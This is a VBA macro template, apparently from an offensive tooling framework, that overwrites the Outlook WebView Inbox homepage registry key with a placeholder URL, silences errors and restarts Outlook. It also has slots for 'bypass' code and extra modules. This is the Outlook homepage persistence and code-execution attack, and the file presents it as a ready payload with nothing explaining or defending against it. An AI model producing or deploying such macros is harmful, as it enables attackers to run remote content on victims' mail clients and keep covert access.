{{bypassCode}}

{{moduleCode}}

Function RegKeyRead(szRegKey As String) As String
	Dim objWscriptShell As Object
	On Error Resume Next
	Set objWscriptShell = CreateObject("WScript.Shell")
	RegKeyRead = objWscriptShell.RegRead(szRegKey)
	Set objWscriptShell = Nothing
End Function

Function RegKeySave(szRegKey As String, szValue As String, szType As String)
    Dim objWscriptShell As Object
	On Error Resume Next
    Set objWscriptShell = CreateObject("WScript.Shell")
    objWscriptShell.RegWrite szRegKey, szValue, szType
End Function

Sub set_homepage()

	Dim szKey As String
	Dim szValue As String
	Dim objOutlook As Application
	
	On Error Resume Next
	
	{{bypassCalls}}
	
	{{moduleCalls}}
   
	szKey = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Left(Application.Version, 4) & "\Outlook\OutlookName"
	szValue = RegKeyRead(szKey)
	
	If szValue Like "Outlook" Then
	
		szKey = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Left(Application.Version, 4) & "\Outlook\WebView\Inbox\URL"
		szValue = "{{HomepageURL}}"
		RegKeySave szKey, szValue, "REG_SZ"
		
		Set objOutlook = GetObject(,"Outlook.Application")
		If Err.Number = 0 Then
			objOutlook.Quit
		End If
		Set objOutlook = Nothing
	
	End If

End Sub
